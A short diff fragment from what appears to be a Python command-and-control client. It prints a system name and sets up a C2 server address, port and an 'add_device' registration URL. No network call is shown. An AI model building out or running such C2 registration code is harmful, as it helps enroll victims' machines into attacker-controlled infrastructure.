@@ -23,6 +23,7 @@ def get_system_name():
 # Usage
 system_name = get_system_name()
 print(f"System name: {system_name}")
+
 c2_ip = '0.0.0.0'
 c2_port = '8000'
 add_device_url = f'http://{c2_ip}:{c2_port}/add_device/'
